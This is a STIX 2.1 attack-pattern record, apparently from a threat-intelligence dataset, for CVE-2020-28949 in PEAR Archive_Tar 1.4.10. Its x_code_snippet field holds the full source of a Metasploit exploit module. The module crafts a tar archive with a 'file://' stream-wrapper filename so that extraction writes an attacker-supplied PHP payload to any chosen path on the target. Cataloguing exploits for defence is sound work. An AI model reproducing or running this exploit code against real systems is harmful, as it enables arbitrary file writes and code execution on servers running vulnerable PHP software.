{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e47e5524-ba16-4fb1-8ae2-68b0705fd6d0",
    "created": "2024-08-14T17:05:02.134936Z",
    "modified": "2024-08-14T17:05:02.13494Z",
    "name": "PEAR Archive_Tar 1.4.10 Arbitrary File Write",
    "description": " This module takes advantages of Archive_Tar <= 1.4.10's lack of validation of file stream wrappers contained within filenames to write an arbitrary file containing user controlled content to an arbitrary file on disk. Note that the file will be written to disk with the permissions of the user that PHP is running as, so it may not be possible to overwrite some files if the PHP user is not appropriately privileged.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/fileformat/archive_tar_arb_file_write.rb",
            "external_id": "archive_tar_arb_file_write.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pear/Archive_Tar/issues/33"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-28949"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'PEAR Archive_Tar 1.4.10 Arbitrary File Write',\n        'Description' => %q{\n          This module takes advantages of Archive_Tar <= 1.4.10's lack of validation of file stream wrappers contained\n          within filenames to write an arbitrary file containing user controlled content to an arbitrary file\n          on disk. Note that the file will be written to disk with the permissions of the user that PHP is\n          running as, so it may not be possible to overwrite some files if the PHP user is not appropriately\n          privileged.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'gwillcox-r7', # Metasploit module\n          'xorathustra', # Original advisory and PoC\n        ],\n        'References' => [\n          ['URL', 'https://github.com/pear/Archive_Tar/issues/33'],\n          ['CVE', '2020-28949']\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        },\n        'DefaultOptions' => {\n          'EXITFUNC' => 'thread',\n          'DisablePayloadHandler' => true\n        },\n        'Platform' => ['php'],\n        'Arch' => ARCH_PHP,\n        'Targets' => [\n          ['Archive_Tar <= 1.4.10', {}]\n        ],\n        'Privileged' => false,\n        'DisclosureDate' => '2020-11-17'\n      )\n    )\n\n    register_options([\n      OptString.new('FILEPATH', [true, 'The full path to the file to write on the target.', '/tmp/msf.php'])\n    ])\n  end\n\n  def exploit\n    # Create malicious tar archive\n    tarfile = StringIO.new\n    Rex::Tar::Writer.new tarfile do |tar|\n      tar.add_file \"file://#{datastore['FILEPATH']}\", 0o644 do |io|\n        io.write payload.encoded\n      end\n    end\n    tarfile.rewind\n    file_buffer = tarfile.read\n\n    print_status \"Writing file: #{datastore['FILENAME']} (#{file_buffer.length} bytes) ...\"\n    file_create file_buffer\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-11-17",
    "x_mitre_platforms": [
        "['php']"
    ]
}